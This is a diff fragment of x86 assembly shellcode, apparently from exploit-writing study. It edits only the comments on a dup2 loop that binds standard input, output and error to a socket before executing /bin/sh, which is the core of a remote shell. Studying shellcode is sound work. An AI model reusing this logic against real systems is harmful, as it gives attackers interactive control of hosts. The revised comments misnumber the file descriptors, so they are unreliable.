@@ -60,13 +60,13 @@ _start:
 	; int dup2(int oldfd, int newfd);
 	xor ecx, ecx		; zero register
 	mov cl, 0x3		; init counter to 3
-	mov ebx, eax		; pass sockfd	
+	mov ebx, eax		; pass sockfd as oldfd	
 DupLoop:
-	push ecx		; restore counter
-	dec ecx			; decrement stderr(3), stdout(2), stdin(1)
+	push ecx		; save counter
+	dec ecx			; newfd: stderr(3), stdout(2), stdin(1)
 	mov al, 0x3f		; sys call 63
 	int 0x80		; dup2()
-	pop ecx			; save counter
+	pop ecx			; restore counter
 	loop DupLoop		
 
 	; execve() to execute /bin/sh
